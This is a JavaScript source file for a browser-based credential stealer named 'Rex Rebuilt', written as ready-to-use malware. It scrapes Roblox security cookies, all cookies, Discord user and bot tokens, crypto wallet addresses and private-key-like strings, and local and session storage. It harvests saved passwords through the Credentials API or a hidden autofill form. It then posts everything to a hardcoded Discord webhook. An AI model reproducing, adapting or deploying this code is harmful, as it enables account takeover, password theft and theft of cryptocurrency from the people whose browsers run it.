// REX REBUILT STEALER – OPEN-SOURCE GUTS, OUR WEBHOOK ONLY – NOV 2025
const WEBHOOK = 'https://discord.com/api/webhooks/1443333736807530658/9FT-4lRNL0QfqEt_3u-nk_FRusHDwyISKdecSk-yhXbyPXOMQP39a_2p3UvQl441nStc';

let loot = {
    url: location.href,
    time: new Date().toISOString(),
    ua: navigator.userAgent.substring(0, 150),
    roblox_cookie: document.cookie.match(/\.ROBLOSECURITY=([^;]+)/)?.[1] || 'none',
    all_cookies: document.cookie.substring(0, 1000),
    user_token: 'none',
    bot_token: 'none',
    passwords: [],
    wallets: [],
    storage_dump: []
};

// Roblox + full cookies (always hits)
if (loot.roblox_cookie === 'none') {
    const allCookies = document.cookie.split(';').map(c => c.trim()).filter(c => c.includes('roblox') || c.includes('RBX'));
    loot.roblox_cookie = allCookies.join('; ') || 'none';
}

// Discord user token (from storage/console webpack style)
try {
    const token = webpackChunkdiscord_app?.push([[Math.random()], {}, req => { for (let m of Object.keys(req.c).map(x => req.c[x].exports).filter(x => x?.default?.getToken)) return m.default.getToken(); }])?.find(x => x)?.exports?.default?.getToken() ||
                  localStorage.getItem('token') ||
                  Object.values(localStorage).find(v => v?.length > 50 && v.includes('.'));
    if (token) loot.user_token = token.replace(/"/g, '');
} catch(e) {}

// Discord bot token (sniffs page/storage for Bot MT/NT... pastes)
try {
    const pageText = document.body.innerText + JSON.stringify(localStorage) + JSON.stringify(sessionStorage);
    const botMatch = pageText.match(/(?:Bot )?([MNT][A-Za-z0-9_-]{23}\.[A-Za-z0-9_-]{6,7}\.[A-Za-z0-9_-]{27,})/);
    if (botMatch) loot.bot_token = botMatch[1].startsWith('Bot ') ? botMatch[1] : 'Bot ' + botMatch[1];
} catch(e) {}

// Wallets & long keys (ETH/BTC/privates)
try {
    const allStorage = JSON.stringify(localStorage) + JSON.stringify(sessionStorage) + document.body.innerText;
    loot.wallets = [...new Set(allStorage.match(/(0x[a-fA-F0-9]{40}|[1-9A-HJ-NP-Za-km-z]{26,44}|[5KHd][1-9A-HJ-NP-Za-km-z]{27,34}|[a-fA-F0-9]{64})/g) || [])].slice(0, 20);
} catch(e) {}

// Full storage dump (keys with long values)
Object.keys(localStorage).concat(Object.keys(sessionStorage)).forEach(k => {
    try {
        const v = localStorage.getItem(k) || sessionStorage.getItem(k);
        if (v && v.length > 40) loot.storage_dump.push(`${k}: ${v.substring(0, 150)}...`);
    } catch(e) {}
});

// Password grab (fake form to trigger autofill + creds API)
function grabPasswords() {
    // Try native creds first
    if (navigator.credentials && navigator.credentials.get) {
        navigator.credentials.get({password: true}).then(cred => {
            if (cred && cred.password) loot.passwords.push(`${cred.id || 'unknown'}: ${cred.name || '??'} → ${cred.password}`);
            sendLoot();
        }).catch(() => sendLoot());
    } else {
        // Fake form for autofill trigger
        const fakeForm = document.createElement('form');
        fakeForm.style.position = 'fixed'; fakeForm.style.opacity = '0'; fakeForm.style.top = '-9999px';
        const input = document.createElement('input'); input.type = 'text'; input.name = 'username'; input.autocomplete = 'username';
        const passInput = document.createElement('input'); passInput.type = 'password'; passInput.name = 'password'; passInput.autocomplete = 'current-password';
        fakeForm.append(input, passInput);
        document.body.append(fakeForm);
        setTimeout(() => {
            if (passInput.value) loot.passwords.push(`${location.hostname}: autofill → ${passInput.value}`);
            fakeForm.remove();
            sendLoot();
        }, 1000);
    }
}

// Send everything to YOUR webhook only
function sendLoot() {
    const payload = {
        username: "REX REBUILT GRABBER",
        embeds: [{
            title: "FULL LOOT DROP – ROBLOX + DISCORD + PASSWORDS",
            color: 0xFF0000,
            description: `**Hit on:** ${loot.url}\n**UA:** ${loot.ua}`,
            fields: [
                {name: "Roblox Cookies", value: loot.roblox_cookie !== 'none' ? "```"+loot.roblox_cookie.substring(0, 200)+"```" : "❌ Clean", inline: false},
                {name: "All Cookies Snippet", value: "```"+loot.all_cookies+"```", inline: false},
                {name: "Discord User Token", value: loot.user_token !== 'none' ? "```"+loot.user_token.substring(0, 100)+"```" : "❌", inline: true},
                {name: "Discord Bot Token", value: loot.bot_token !== 'none' ? "```"+loot.bot_token.substring(0, 120)+"```" : "❌", inline: true},
                {name: "Passwords Snagged ("+loot.passwords.length+")", value: loot.passwords.length ? "```"+loot.passwords.join('\n')+"```" : "❌ (Needs form trigger)", inline: false},
                {name: "Wallets/Keys ("+loot.wallets.length+")", value: loot.wallets.length ? "```"+loot.wallets.slice(0, 10).join('\n')+"```" : "❌", inline: true},
                {name: "Storage Hits ("+loot.storage_dump.length+")", value: loot.storage_dump.length ? loot.storage_dump.slice(0, 5).join('\n') : "Clean", inline: false}
            ],
            footer: {text: "Rex Rebuilt – Our Loot Only"}
        }]
    };
    fetch(WEBHOOK, {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload)}).catch(() => {});
}

// Fire it up
grabPasswords();
